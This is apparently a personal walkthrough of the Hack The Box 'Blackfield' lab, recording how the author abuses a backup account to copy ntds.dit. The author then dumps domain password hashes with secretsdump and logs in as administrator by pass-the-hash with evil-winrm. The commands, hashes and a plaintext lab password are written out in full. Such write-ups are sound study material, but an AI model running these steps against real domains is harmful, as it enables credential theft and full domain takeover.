
Now  i going to follow this post as ippsec walkthrough was not able to setup by meeeeeeeeeeeeeeeeeeeee.
```
cme smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d' --shares
```
![[Pasted image 20231119210826.png]]

```
cd \\10.10.10.192\C$\Windows\Temp
```

```
mkdir CFX
```

```
 wbadmin start backup -backuptarget:\\10.10.10.192\C$\Windows\Temp\CFX\ -include:c:\Windows\ntds\ntds
 .dit -quiet
```


![[Pasted image 20231119211521.png]]
Finally able to see this happening after hours of failing it.

```
 wbadmin get versions
```
![[Pasted image 20231119211802.png]]

```
wbadmin start recovery -version:11/19/2023-23:44 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\Users\svc_backup\Documents -notrestoreacl -quiet
```
![[Pasted image 20231119212537.png]]

Let's see if we can download the file
```
download ntds.dit
```
![[Pasted image 20231119213747.png]]


```
reg save HKLM\SYSTEM C:\Users\svc_backup\Documents\SYSTEM
```
![[Pasted image 20231119221526.png]]

As i was not able to download the file using smb due to file size or what i don't know but i simply copy the file into profile and mount it so that i will copy from there.
```
smbclient \\\\10.10.10.192\\C$ -U 'svc_backup' --pw-nt-hash '9658d1d1dcd9250115e2205d9f48400d'
```
![[Pasted image 20231119222804.png]]

Note i have to change the password again for the audit account as it's 2nd day for the box 
```
mount -t cifs -o 'username=audit2020,password=#00^BlackKnight' //10.10.10.192/profiles$ /mnt
```

![[Pasted image 20231119225456.png]]

I have copied all the files successfully let's see if we can run the secretdump and get the hashes finally.
lsass.zip hashes didn't work cuz in the note it was written they are either changing the password or excrypted.

```
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:5ce8284617222d67c2eaee0be7ec3aa5:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

Let's try evil-winrm or pysexec or something on those line using he hash.
```
cme smb 10.10.10.192 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee' --shares
```
![[Pasted image 20231119230228.png]]

```
evil-winrm -i 10.10.10.192 -P 5985 -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
```

![[Pasted image 20231119230456.png]]
```
4375a629c7c67c8e29db269060c955cb
```

We have pwned the box but i would have gone with the .dll hijacking and see if it works but i want to learn this way as i have learnt that method in the past.

Kudos to this blog for helping showing me the light  when i was stuck in the hell 
https://coldfusionx.github.io/posts/Blackfield-HTB/
